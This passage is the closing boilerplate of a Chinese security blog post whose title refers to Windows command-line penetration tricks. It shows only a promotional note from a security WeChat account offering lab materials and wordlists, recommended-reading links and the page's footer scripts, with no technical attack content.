<p>关注公众号回复“9527”可免费获取一套HTB靶场文档和视频，“1120”安全参考杂志电子版，“1208”个人常用高效爆破字典，“0221”2020年酒仙桥文章打包，“2191”9月1日前潇湘信安所有文章打包。</p>
<p> <img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeSsicAgIUNHtMib9a69NOWXw1A7mgRqqiat1SycQ0b6e5mBqC0pVJ3oicrQnCTh4gqMGiaKUPicTsUc4Tw/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt> 还在等什么？赶紧点击下方名片关注学习吧！<img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeSsicAgIUNHtMib9a69NOWXw1A7mgRqqiat1SycQ0b6e5mBqC0pVJ3oicrQnCTh4gqMGiaKUPicTsUc4Tw/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt></p>
<p><img src="http://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOdSMdwH23ehXbQrbUlOvt6YLhRjHMxGMsH55CSVdlMC0XEwtoAQI06hia8rd371BcDnQ8bfRmP4YqA/0?wx_fmt=png" alt></p>
<p><strong>潇湘信安</strong></p>
<p>一个不会编程、挖SRC、代码审计的安全爱好者，主要分享一些安全经验、渗透思路、奇淫技巧与知识总结。</p>
<p>110篇原创内容</p>
<p>公众号</p>
<hr>
<p><strong>推 荐 阅 读</strong></p>
<p><a href="http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&amp;mid=2247491360&amp;idx=1&amp;sn=e4c3d356b45d7fe821dc2b645f30a595&amp;chksm=cfa6bb33f8d132259884026238db7b79f33da3f3fff2f90a87e4a447118a1be8c4e948031d8f&amp;scene=21 textvalue=" target="_blank" rel="noopener"><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOec0rlHvusMpuZ14HCT4dZn9ZdY1H6uNgSDcvJmovZibZVy4FV2kEib6nJ9SASN1b4Es56KdPsHWibKg/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt></a></p>
<p><a href="http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&amp;mid=2247486961&amp;idx=1&amp;sn=d02db4cfe2bdf3027415c76d17375f50&amp;chksm=cfa6a9e2f8d120f4c9e4d8f1a7cd50a1121253cb28cc3222595e268bd869effcbb09658221ec&amp;scene=21 data-itemshowtype=" target="_blank" rel="noopener"><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLcIJDWu9lMmvjKulJ1TxiavKVzyum8jfLVjSYI21rq57uueQafg0LSTCA/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt></a></p>
<p><a href="http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&amp;mid=2247486327&amp;idx=1&amp;sn=71fc57dc96c7e3b1806993ad0a12794a&amp;chksm=cfa6af64f8d1267259efd56edab4ad3cd43331ec53d3e029311bae1da987b2319a3cb9c0970e&amp;scene=21 data-itemshowtype=" target="_blank" rel="noopener"><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf8eyzKWPF5pVok5vsp74xolhlyLt6UPab7jQddW6ywSs7ibSeMAiae8TXWjHyej0rmzO5iaZCYicSgxg/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt></a></p>
<hr>
<p><strong>欢 迎 私 下 骚 扰</strong></p>
<p><img src="/s/data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt></p>
<p>var first_sceen__time = (+new Date()); if (“” == 1 &amp;&amp; document.getElementById(‘js_content’)) { document.getElementById(‘js_content’).addEventListener(“selectstart”,function(e){ e.preventDefault(); }); }</p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="/projects_url">项目</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Windows命令行下常用渗透技巧"><span class="toc-number">1.</span> <span class="toc-text">Windows命令行下常用渗透技巧</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://allblue147.github.io/2021/11/26/Windows命令行下常用渗透技巧/Windows命令行下常用渗透技巧/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://allblue147.github.io/2021/11/26/Windows命令行下常用渗透技巧/Windows命令行下常用渗透技巧/&text="><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://allblue147.github.io/2021/11/26/Windows命令行下常用渗透技巧/Windows命令行下常用渗透技巧/&title="><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://allblue147.github.io/2021/11/26/Windows命令行下常用渗透技巧/Windows命令行下常用渗透技巧/&is_video=false&description="><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=&body=Check out this article: http://allblue147.github.io/2021/11/26/Windows命令行下常用渗透技巧/Windows命令行下常用渗透技巧/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://allblue147.github.io/2021/11/26/Windows命令行下常用渗透技巧/Windows命令行下常用渗透技巧/&title="><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://allblue147.github.io/2021/11/26/Windows命令行下常用渗透技巧/Windows命令行下常用渗透技巧/&title="><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://allblue147.github.io/2021/11/26/Windows命令行下常用渗透技巧/Windows命令行下常用渗透技巧/&title="><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://allblue147.github.io/2021/11/26/Windows命令行下常用渗透技巧/Windows命令行下常用渗透技巧/&title="><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://allblue147.github.io/2021/11/26/Windows命令行下常用渗透技巧/Windows命令行下常用渗透技巧/&name=&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://allblue147.github.io/2021/11/26/Windows命令行下常用渗透技巧/Windows命令行下常用渗透技巧/&t="><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2022
    JYP
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="/projects_url">项目</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'">


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功!");
      e.clearSelection();
    })
  })
  </script>

<script src="/js/main.js"></script>
<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->


<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
